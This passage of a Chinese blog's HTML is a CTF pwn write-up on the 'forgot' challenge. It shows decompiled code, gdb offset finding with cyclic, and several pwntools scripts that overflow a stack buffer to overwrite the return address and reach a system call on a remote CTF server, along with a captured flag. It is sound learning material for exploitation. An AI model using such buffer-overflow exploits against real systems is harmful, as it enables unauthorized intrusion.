class="number">9</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">9</span>:</span><br><span class="line">        v14 = <span class="number">10</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  (*(&amp;v3 + --v14))();</span><br><span class="line">  <span class="keyword">return</span> fflush(<span class="built_in">stdout</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="先看下-isoc99-scanf这个漏洞！查看它的汇编代码"><a href="#先看下-isoc99-scanf这个漏洞！查看它的汇编代码" class="headerlink" title="先看下__isoc99_scanf这个漏洞！查看它的汇编代码"></a>先看下__isoc99_scanf这个漏洞！查看它的汇编代码</h3><p><img src="https://s2.ax1x.com/2019/11/03/KXtsjU.png" alt="KXtsjU.png"><br>我们可以通过溢出数组v232字节大小，将上卖弄我们找到的system函数起始地址覆盖掉返回地址！<br>于是开始攻击：</p>
<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#coding:utf8</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">#context.log_level=<span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line">#conn=process(<span class="string">"./forgot"</span>)</span><br><span class="line">conn=remote(<span class="string">"111.198.29.45"</span>,<span class="string">"49142"</span>)</span><br><span class="line"></span><br><span class="line">sys_addr=<span class="number">0x080486CC</span></span><br><span class="line">#conn.recv()</span><br><span class="line">#conn.sendline(<span class="string">"yang"</span>)</span><br><span class="line">conn.sendlineafter(<span class="string">"&gt; "</span>,<span class="string">"yang"</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">"a"</span>*<span class="number">32</span>+<span class="string">"b"</span>*<span class="number">4</span>+p32(sys_addr)</span><br><span class="line"></span><br><span class="line">conn.recv()</span><br><span class="line">conn.sendline(payload)</span><br><span class="line">#conn.sendlineafter(<span class="string">"&gt; "</span>,payload)#这样就跑不出来了    不是清楚为何原因</span><br><span class="line">conn.interactive()<span class="comment">//cyberpeace&#123;7908ad1e9a7667d0115faa6bdf8c24b1&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="再看下这个gets函数漏洞"><a href="#再看下这个gets函数漏洞" class="headerlink" title="再看下这个gets函数漏洞"></a>再看下这个gets函数漏洞</h3><blockquote>
<p>直接利用gets 函数的漏洞，让sysaddr的地址覆盖了 main()函数push进来来的ebp</p>
</blockquote>
<blockquote>
<p>这里真的是学到的，果然，进步都是刷经验刷出来的！<br>首先找到 gets(s)  //name s在栈中相对与   main()函数push进来来的ebp 的偏移量是多少<br>首先在python 中：</p>
</blockquote>
<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">cyclic(<span class="number">100</span>)</span><br><span class="line">#于是会给我们自动生成<span class="number">100</span>字节的不重复的字节（<span class="number">4</span>个位单位）</span><br><span class="line"><span class="string">'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>然后在gdb ./forgot</p>
</blockquote>
<figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">r</span><br><span class="line">What is your name?</span><br><span class="line"><span class="meta">#它回复我们的</span></span><br><span class="line"><span class="meta">#然后我们输入100字节的不重复字符串（加上单引号  也没关系的）</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#Legend: code, data, rodata, value</span></span><br><span class="line"><span class="meta">#Stopped reason: SIGSEGV</span></span><br><span class="line"><span class="meta">#0x61726161 in ?? ()  其实？？其实就是main()函数push进来的ebp所在的地址</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>我们有时不能一眼看出内存数据 0x61726161 对应的是什么，所以写代码嘛##########<br>#下面这个感觉要学习下（刷经验嘛）</p>
</blockquote>
<figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">text</span>=<span class="string">""</span></span><br><span class="line">char_list=[]</span><br><span class="line"><span class="built_in">char</span>=<span class="string">"61726161"</span></span><br><span class="line"><span class="keyword">for</span> i in range(<span class="number">0</span>,len(<span class="built_in">char</span>),<span class="number">2</span>):</span><br><span class="line">    char_list.<span class="built_in">append</span>(<span class="built_in">char</span>[i:i+<span class="number">2</span>])</span><br><span class="line">char_list.<span class="built_in">reverse</span>()</span><br><span class="line"><span class="built_in">print</span>(char_list)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i in char_list:</span><br><span class="line">    <span class="built_in">text</span>+=chr(<span class="built_in">int</span>(i,<span class="number">16</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">text</span>)</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.ax1x.com/2019/11/03/KXt6uF.png" alt="KXt6uF.png"></p>
<blockquote>
<p>我们再次进入python中;<br><img src="https://s2.ax1x.com/2019/11/03/KXtcB4.png" alt="KXtcB4.png"><br>因为  -4  是因为  67到63 是用来填充返回地址 （这里即是sysaddr）的</p>
</blockquote>
<h3 id="于是构造exp：我这里有点不明白，怎么个回事！-我这个运行不出来"><a href="#于是构造exp：我这里有点不明白，怎么个回事！-我这个运行不出来" class="headerlink" title="于是构造exp：我这里有点不明白，怎么个回事！  我这个运行不出来"></a>于是构造exp：我这里有点不明白，怎么个回事！  我这个运行不出来</h3><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#coding:utf8</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">#context.log_level=<span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line">#conn=process(<span class="string">"./forgot"</span>)</span><br><span class="line">conn=remote(<span class="string">"111.198.29.45"</span>,<span class="string">"49142"</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">"a"</span>*<span class="number">63</span>+p32(<span class="number">0x080486cc</span>)</span><br><span class="line"></span><br><span class="line">conn.recv()</span><br><span class="line">conn.sendline(payload)</span><br><span class="line">#conn.sendlineafter(<span class="string">"&gt; "</span>,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">conn.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.ax1x.com/2019/11/03/KXtRE9.png" alt="KXtRE9.png"></p>
<blockquote>
<p>而参考网上的却可以   ？？？很懵！</p>
</blockquote>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = remote('<span class="number">111.198</span><span class="number">.29</span><span class="number">.45</span>','<span class="number">49142</span>')</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">payload = 'A'*<span class="number">63</span> + p32(<span class="number">0x080486cc</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.ax1x.com/2019/11/03/KXtWNR.png" alt="KXtWNR.png"></p>
<p><img src="https://s2.ax1x.com/2019/10/12/uXYRN4.png" alt="uXYRN4.png"><br>要舒展啊！</p>

      
    </div>

    <div>
      
        
      
    </div>

    <div>
      
        

      
    </div>

    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/tags/pwn/" rel="tag">#pwn</a>
          
        </div>
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2019/11/02/疯狂的木头07/" rel="next" title="疯狂的木头07">
                <i class="fa fa-chevron-left"></i> 疯狂的木头07
              </a>
            
          </div>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2019/11/03/UNCTF2019 re00/" rel="prev" title="UNCTF2019 re00">
                UNCTF2019 re00 <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          
  <div class="comments" id="comments">
    
  </div>


        </div>
        
          
  
<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            文章目录
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview">
            站点概览
          </li>
        </ul>
      

      <section class="site-overview sidebar-panel ">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
          <img class="site-author-image" itemprop="image" src="/images/avatar.gif" alt="木头">
          <p class="site-author-name" itemprop="name">木头</p>
          <p class="site-description motion-element" itemprop="description">做个靠谱的人！</p>
        </div>
        <nav class="site-state motion-element">
          <div class="site-state-item site-state-posts">
            <a href="/archives">
              <span class="site-state-item-count">54</span>
              <span class="site-state-item-name">日志</span>
            </a>
          </div>

          

          
            <div class="site-state-item site-state-tags">
              <a href="/tags">
                <span class="site-state-item-count">19</span>
                <span class="site-state-item-name">标签</span>
              </a>
            </div>
          
		  <br>
		  <span id="busuanzi_container_site_uv">
			<b><span id="busuanzi_value_site_uv"></span></b><br>
			<span class="site-state-item-name">访客</span>
			</span>


        </nav>

        
          <div class="feed-link motion-element">
            <a href="/atom.xml" rel="alternate">
              <i class="fa fa-rss"></i>
              RSS
            </a>
          </div>
        

    <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="298" height="52" src="//music.163.com/outchain/player?type=2&id=453175619&auto=0&height=32"></iframe>

    <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="298" height="52" src="//music.163.com/outchain/player?type=2&id=805197&auto=1&height=32"></iframe>
    
		<br>
		<div align="left" font-family: "arial","microsoft yahei","黑体","宋体",sans-serif>
		<b><h1>个人简介</h1></b>
		<p>姓名：木头<br>
		性别：男<br>
		QQ：1594783824<br>
		爱好：书,球,歌<br>
		主要奖项： xxx</p>
		</div>
		<br>

        <div class="links-of-author motion-element">
          
        </div>

        
        

        
        

      </section>

      
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">
            
              
            
            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#dice-game"><span class="nav-number">1.</span> <span class="nav-text">dice_game</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#这个程序，有点长得不像pwn！"><span class="nav-number">1.0.1.</span> <span class="nav-text">这个程序，有点长得不像pwn！</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#大致就是这样，我们分析下main-函数"><span class="nav-number">1.0.2.</span> <span class="nav-text">大致就是这样，我们分析下main()函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#我们再去看看关键的sub-A20-函数"><span class="nav-number">1.0.3.</span> <span class="nav-text">我们再去看看关键的sub_A20()函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#所以我们看下srand-0-以及buff数组在栈上的分布："><span class="nav-number">1.0.4.</span> <span class="nav-text">所以我们看下srand[0]以及buff数组在栈上的分布：</span></a></li></ol></li></ol><li class="nav-item nav-level-1"><a class="nav-link" href="#forgot"><span class="nav-number">2.</span> <span class="nav-text">forgot</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#这个程序有两个漏洞，利用任意一个可以达到pwn的目的！"><span class="nav-number">2.0.1.</span> <span class="nav-text">这个程序有两个漏洞，利用任意一个可以达到pwn的目的！</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ida分析下："><span class="nav-number">2.0.2.</span> <span class="nav-text">ida分析下：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#先看下-isoc99-scanf这个漏洞！查看它的汇编代码"><span class="nav-number">2.0.3.</span> <span class="nav-text">先看下__isoc99_scanf这个漏洞！查看它的汇编代码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#再看下这个gets函数漏洞"><span class="nav-number">2.0.4.</span> <span class="nav-text">再看下这个gets函数漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#于是构造exp：我这里有点不明白，怎么个回事！-我这个运行不出来"><span class="nav-number">2.0.5.</span> <span class="nav-text">于是构造exp：我这里有点不明白，怎么个回事！  我这个运行不出来</span></a></li></ol></li></div>
            
          </div>
        </section>
      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2020</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">木头</span>
</div>

<div class="powered-by">
<i class="fa fa-user-md"></i><span id="busuanzi_container_site_pv">
    本站总访问量<span id="busuanzi_value_site_pv"></span>次
</span>

</div>


<div class="powered-by">
  由 <a class="theme-link" href="http://hexo.io">Hexo</a> 强力驱动
</div>

<div class="theme-info">
  主题 -
  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
    NexT.Muse
  </a>
</div>

        

        
      </div>
    </footer>

    <div class="back-to-top">
      <i class="fa fa-arrow-up"></i>
    </div>
  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  



  
  <script type="text/javascript" src="/vendors/jquery/index.js?v=2.1.3"></script>

  
  <script type="text/javascript" src="/vendors/fastclick/lib/fastclick.min.js?v=1.0.6"></script>

  
  <script type="text/javascript" src="/vendors/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>

  
  <script type="text/javascript" src="/vendors/velocity/velocity.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/vendors/velocity/velocity.ui.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/vendors/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.0.1"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.0.1"></script>



  
  

  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.0.1"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.0.1"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.0.1"></script>



  



  



  
  
  

  

  

</body>
</html>
